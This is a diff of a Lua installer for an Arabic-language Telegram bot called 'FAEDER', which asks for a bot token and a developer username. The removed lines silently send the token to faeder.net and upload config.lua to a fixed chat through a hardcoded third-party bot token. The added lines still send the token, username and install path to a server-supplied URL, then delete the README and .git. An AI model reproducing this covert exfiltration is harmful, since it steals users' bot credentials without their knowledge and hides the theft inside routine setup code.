@@ -20,17 +20,72 @@ day = 313456502
 function vardump(value)  
 print(serpent.block(value, {comment=false}))  
 end 
-local AutoSet = function()
-io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
-local SUDO = tonumber(io.read())   
-if not tostring(SUDO):match('%d+') then  
-local SUDO = 1299351897
+local function AutoSet(token)
+if not token then
+io.write("\27[34;47m◼¦ الآن ادخل توكن بوتك هنا ↓ \27[0;1;36m\n") 
+token = io.read():gsub(' ','')
+if token == '' then
+io.write("\27[31;47m◼¦ عذراً، لم تقم بادخال توكن البوت\27[0;m\n") 
+AutoSet()
 end
-io.write("\27[31;47m\n◼¦ ارسل معرف المطور الاساسي مع ال @ SEND ID FOR username \27[0;34;49m\n")  
-local username = io.read()
-io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  
-local token = io.read()  
-botid = token:match("(%d+)")
+
+local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
+if res ~= 200 then
+io.write("\27[31;47m◼¦ التوكن الذي ادخلته غير صحيح ، تاكد من التوكن وحاول مرة مجدداً!\27[0;m\n") 
+AutoSet()
+end
+local getToken = JSON.decode(url)
+botid = getToken.result.id
+botusername = getToken.result.username
+io.write("\27[34;47m◼¦ تم ادخال توكن البوت بنجاح \nUserName Bot : \27[0;32;47m@"..botusername.."\n")
+end
+
+io.write("\27[34;47m◼¦ الآن ادخل معرف المطور هنا ↓ \27[0;1;36m\n") 
+local username = io.read():gsub(' ','')
+if username == '' then
+io.write("\27[31;47m◼¦ عذراً، لم تقم بادخال معرف المطور\27[0;m \n") 
+AutoSet(token)
+end
+if not username:match('@[%a%d_]') then
+io.write("\27[31;47m◼¦ عذراً، هذا ليس معرف حساب تيليجرام\27[0;m \n") 
+AutoSet(token)
+end
+local Foldir = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+getuser = {}
+getuser.username = username
+getuser.Source  = Foldir
+local url , res = https.request('https://faeder.net/Faeder/index.php?Array='..JSON.encode(getuser))
+if res ~= 200 then
+io.write("\27[31;47m◼¦ حدث خطأ في الاتصال بالسيرفر ، يرجى مراسلة مطور السورس { @KKKKF } ليتمكن من حل المشكلة في اسرع وقت ممكن! \27[0;m\n")
+os.exit()
+end
+Getresult, Getuser = pcall(JSON.decode, url)
+if not Getresult then
+io.write("\27[31;47m◼¦ حدث خطأ في سكرب الاستخراج ، يرجى مراسلة مطور السورس { @KKKKF } ليتمكن من حل المشكلة في اسرع وقت ممكن! \27[0;m\n")
+os.exit()
+end
+if not Getuser.ok then
+if Getuser.result then
+io.write("\27[31;47m◼¦ "..Getuser.result.." \27[0;m\n")
+os.exit()
+end
+io.write("\27[31;47m◼¦ عذراً، لايوجد حساب بهذا المعرف يرجى التاكد منه جيداً!\27[0;m \n") 
+AutoSet(token)
+end
+if Getuser.results.type ~= "user" then
+io.write("\27[31;47m◼¦ عذراً، يرجى ادخال معرف شخص ليكون مطور البوت وليس معرف قناة او مجموعة او بوت!\27[0;m \n") 
+AutoSet(token)
+end
+io.write("\27[34;47m◼¦ تم ادخال معرف المطور بنجاح سيتم تشغيل السورس على البوت الآن \27[0;m\n")
+local WebSite = Getuser.results.WebSite
+infos = {} 
+infos.username = '@'..Getuser.results.username
+infos.userbot  = '@'..botusername
+infos.token  = token
+infos.userjoin  = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request(WebSite..'/request.php?insert='..JSON.encode(infos))
+local SUDO = Getuser.results.id
+
 local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -42,38 +97,24 @@ end
 file:write(serialized)    file:close()  
 end
 local create_config_auto = function()
+new_file = io.open("./FA.txt", "w")  
+new_file:write(token)  
+new_file:close()
 config = {
 SUDO = SUDO,
-token = token,
 bot_id = botid,
 username = username, 
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
-local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 1299351897 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
-file = io.open("RUNFA.sh", "w")  
-file:write([[
-#!/bin/bash 
-token="]]..token..[["
-while(true) do
-rm -fr ../.telegram-cli
-echo -e ""
-echo -e ""
-./tg -s ./FAEDER.lua $@ --bot=$token
-done
-]])  
-file:close()  
-file = io.open("FA", "w")  
-file:write([[
-killall screen
-while(true) do
-rm -fr ../.telegram-cli
-screen ./RUNFA.sh
-done
-]])  
-file:close() 
-os.execute('./FA')
+faederdx1:set(botid..":BotUser:","@"..botusername)
+faederdx1:set(botid..":DataCenter",Getuser.results.DataCenter)
+os.execute([[
+rm -f ./README.md
+rm -rf ./.git
+chmod +x ./FA
+./FA
+]])
 end 
 create_config_auto()
 local serialize_to_file = function(data, file, uglify)  
@@ -88,22 +129,25 @@ file:write(serialized)
 file:close() 
 end end
 local load_faederdx1 = function()  
-local f = io.open("./config.lua", "r")  
-if not f then   AutoSet()  
+local f = io.open("./FA.txt", "r")  
+local c = io.open("./config.lua", "r")  
+if not f or not c then   AutoSet()  
 else   
-f:close()  
+f:close()
+c:close()
 end  
 local config = loadfile("./config.lua")() 
 return config 
 end  
 _faederdx1 = load_faederdx1()  
 sudos = dofile("./config.lua") 
+Token = io.open("./FA.txt","r")
 bot_owner = sudos.SUDO 
 sudo_users = {sudos.sudo_users} 
 bot_id = sudos.bot_id 
 FAEDER = sudos.bot_id
 SUDOUSERNAME = sudos.username
-tokenbot = sudos.token
+tokenbot = Token:read('*a')
 name_bot = (faederdx1:get(FAEDER..'name_bot') or 'فايدر')
 SudoFaeder = SUDOUSERNAME:gsub('@','') 
 SudoFaeder = SudoFaeder:gsub([[\_]],'_')
